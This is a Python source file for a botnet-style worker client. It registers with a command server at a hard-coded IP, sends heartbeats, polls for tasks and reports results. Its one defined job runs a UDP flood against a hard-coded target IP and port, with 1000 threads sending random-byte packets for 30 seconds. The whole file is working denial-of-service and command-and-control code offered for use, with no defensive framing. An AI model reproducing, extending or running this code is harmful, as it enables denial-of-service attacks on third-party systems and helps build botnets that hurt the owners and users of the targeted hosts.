import requests
import threading
import time
import traceback
import socket
import random
import sys


# ============================================================
# CONFIGURATION
# ============================================================

SERVER_URL = "http://34.63.222.47/connectWorker67.php"

POLL_INTERVAL = 5
HEARTBEAT_INTERVAL = 30
REQUEST_TIMEOUT = 15
RECONNECT_DELAY = 5

# USER DATAGRAM

def udp_flooder(target_ip, target_port, packet_size, duration):
    """Sends UDP packets in a loop for a specified duration."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate random bytes to fill the packet payload
    payload = random._urandom(packet_size)
    
    end_time = time.time() + duration
    packet_count = 0
    
    try:
        while time.time() < end_time:
            client.sendto(payload, (target_ip, target_port))
            packet_count += 1
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()


# ============================================================
# WORKER
# ============================================================

class Worker:

    def __init__(self):

        self.worker_id = None
        self.worker_token = None

        self.running = True

        self.session = requests.Session()

        self.heartbeat_thread = threading.Thread(
            target=self.heartbeat_loop,
            daemon=True
        )

        self.lock = threading.Lock()


    # ========================================================
    # REGISTER
    # ========================================================

    def register(self):

        while self.running:

            try:

                response = self.session.post(
                    SERVER_URL,
                    json={
                        "action": "register"
                    },
                    timeout=REQUEST_TIMEOUT
                )

                response.raise_for_status()

                data = response.json()

                if not data.get("ok"):

                    print(
                        "Registration failed:",
                        data.get(
                            "error",
                            "Unknown error"
                        )
                    )

                    time.sleep(
                        RECONNECT_DELAY
                    )

                    continue


                worker_id = data.get(
                    "worker_id"
                )

                worker_token = data.get(
                    "worker_token"
                )


                if not worker_id or not worker_token:

                    print(
                        "Registration response is missing credentials."
                    )

                    time.sleep(
                        RECONNECT_DELAY
                    )

                    continue


                with self.lock:

                    self.worker_id = worker_id
                    self.worker_token = worker_token


                print()
                print("Worker registered")
                print("Worker ID:", worker_id)


                return True


            except requests.RequestException as e:

                print(
                    "Registration connection error:",
                    e
                )


            except ValueError:

                print(
                    "Server returned invalid JSON during registration."
                )


            except Exception as e:

                print(
                    "Registration error:",
                    e
                )

                traceback.print_exc()


            time.sleep(
                RECONNECT_DELAY
            )


        return False


    # ========================================================
    # CLEAR CREDENTIALS
    # ========================================================

    def clear_credentials(self):

        with self.lock:

            self.worker_id = None
            self.worker_token = None


    # ========================================================
    # WORKER REQUEST
    # ========================================================

    def request(self, data):

        with self.lock:

            worker_id = self.worker_id
            worker_token = self.worker_token


        if not worker_id or not worker_token:

            return None


        request_data = dict(data)

        request_data["worker_id"] = worker_id
        request_data["worker_token"] = worker_token


        try:

            response = self.session.post(
                SERVER_URL,
                json=request_data,
                timeout=REQUEST_TIMEOUT
            )


        except requests.RequestException as e:

            print(
                "Server connection error:",
                e
            )

            return None


        if response.status_code == 401:

            print(
                "Worker authentication expired."
            )

            self.clear_credentials()

            return None


        try:

            data = response.json()


        except ValueError:

            print(
                "Server returned invalid JSON."
            )

            return None


        return data


    # ========================================================
    # HEARTBEAT
    # ========================================================

    def heartbeat(self):

        if not self.worker_id:

            return False


        data = self.request({

            "action":
                "heartbeat"

        })


        if data is None:

            return False


        if not data.get("ok"):

            print(
                "Heartbeat failed:",
                data.get(
                    "error",
                    "Unknown error"
                )
            )

            return False


        return True


    # ========================================================
    # HEARTBEAT LOOP
    # ========================================================

    def heartbeat_loop(self):

        while self.running:

            time.sleep(
                HEARTBEAT_INTERVAL
            )


            if not self.running:

                break


            if not self.worker_id:

                continue


            try:

                self.heartbeat()

            except Exception as e:

                print(
                    "Heartbeat error:",
                    e
                )


    # ========================================================
    # POLL FOR JOB
    # ========================================================

    def poll(self):

        data = self.request({

            "action":
                "poll"

        })


        if data is None:

            return None


        if not data.get("ok"):

            print(
                "Poll failed:",
                data.get(
                    "error",
                    "Unknown error"
                )
            )

            return None


        task = data.get(
            "task"
        )


        if not task:

            return None


        return task


    # ========================================================
    # SEND PROGRESS
    # ========================================================

    def progress(
        self,
        task_id,
        progress,
        message=""
    ):

        data = self.request({

            "action":
                "progress",

            "task_id":
                task_id,

            "progress":
                progress,

            "message":
                message

        })


        if data is None:

            return False


        return bool(
            data.get("ok")
        )


    # ========================================================
    # SEND RESULT
    # ========================================================

    def send_result(
        self,
        task_id,
        result
    ):

        data = self.request({

            "action":
                "result",

            "task_id":
                task_id,

            "result":
                result

        })


        if data is None:

            return False


        if not data.get("ok"):

            print(
                "Result submission failed:",
                data.get(
                    "error",
                    "Unknown error"
                )
            )

            return False


        return True


    # ========================================================
    # JOB 1
    # ========================================================

    def job1(
        self,
        task_id
    ):

        print(
            "Running job1..."
        )


        self.progress(
            task_id,
            0,
            "Starting job 1"
        )


        # ====================================================
        # PUT YOUR ACTUAL JOB 1 CODE HERE
        # ====================================================

        TARGET_IP = '35.73.51.142'
        TARGET_PORT = 9013
        PACKET_SIZE = 2024
        DURATION = 30
        NUM_THREADS = 1000

        print(f"\n[*] Starting UDP flood to {TARGET_IP}:{TARGET_PORT} using {NUM_THREADS} threads for {DURATION} seconds...")

        threads = []
    
        # Start threads
        for _ in range(NUM_THREADS):
            thread = threading.Thread(target=udp_flooder, args=(TARGET_IP, TARGET_PORT, PACKET_SIZE, DURATION))
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        print("Successfully finished!!")

        # ====================================================
        # JOB RESULT
        # ====================================================

        return {

            "success":
                True,

            "message":
                "Job 1 completed successfully"

        }


    # ========================================================
    # EXECUTE TASK
    # ========================================================

    def execute_task(
        self,
        task
    ):

        task_id = task.get(
            "task_id"
        )

        job_id = task.get(
            "job_id"
        )


        if not task_id:

            print(
                "Received task without task_id."
            )

            return


        if job_id is None:

            print(
                "Received task without job_id."
            )

            return


        print()
        print(
            "Received job:",
            job_id
        )

        print(
            "Task ID:",
            task_id
        )


        try:

            # =================================================
            # JOB ROUTER
            # =================================================

            if job_id == 1:

                result = self.job1(
                    task_id
                )


            else:

                result = {

                    "success":
                        False,

                    "error":
                        f"Unknown job ID: {job_id}"

                }


            # =================================================
            # SEND RESULT
            # =================================================

            if self.send_result(
                task_id,
                result
            ):

                print(
                    "Job result submitted."
                )

            else:

                print(
                    "Could not submit job result."
                )


        except Exception as e:

            print()
            print(
                "JOB ERROR:"
            )

            print(
                e
            )

            traceback.print_exc()


            failed_result = {

                "success":
                    False,

                "error":
                    str(e)

            }


            if self.send_result(
                task_id,
                failed_result
            ):

                print(
                    "Failed-job result submitted."
                )

            else:

                print(
                    "Could not submit failed-job result."
                )


    # ========================================================
    # MAIN LOOP
    # ========================================================

    def run(self):

        print(
            "Starting worker..."
        )


        # ====================================================
        # REGISTER
        # ====================================================

        if not self.register():

            return


        # ====================================================
        # START HEARTBEAT
        # ====================================================

        if not self.heartbeat_thread.is_alive():

            self.heartbeat_thread.start()


        print(
            "Worker is waiting for jobs..."
        )


        # ====================================================
        # POLL FOREVER
        # ====================================================

        while self.running:

            try:

                # ------------------------------------------------
                # Make sure we have credentials.
                # ------------------------------------------------

                if (
                    not self.worker_id or
                    not self.worker_token
                ):

                    print(
                        "Worker credentials missing."
                    )

                    print(
                        "Re-registering..."
                    )


                    if not self.register():

                        break


                    continue


                # ------------------------------------------------
                # Poll server.
                # ------------------------------------------------

                task = self.poll()


                # ------------------------------------------------
                # Authentication failure.
                # ------------------------------------------------

                if (
                    not self.worker_id or
                    not self.worker_token
                ):

                    print(
                        "Re-registering worker..."
                    )

                    self.register()

                    continue


                # ------------------------------------------------
                # No job.
                # ------------------------------------------------

                if task is None:

                    time.sleep(
                        POLL_INTERVAL
                    )

                    continue


                # ------------------------------------------------
                # Job received.
                # ------------------------------------------------

                self.execute_task(
                    task
                )


            except KeyboardInterrupt:

                print()
                print(
                    "Stopping worker..."
                )

                self.running = False

                break


            except Exception as e:

                print(
                    "Worker loop error:",
                    e
                )

                traceback.print_exc()


                time.sleep(
                    RECONNECT_DELAY
                )


        print(
            "Worker stopped."
        )


        try:

            self.session.close()

        except Exception:

            pass


# ============================================================
# START WORKER
# ============================================================

if __name__ == "__main__":

    worker = Worker()

    worker.run()
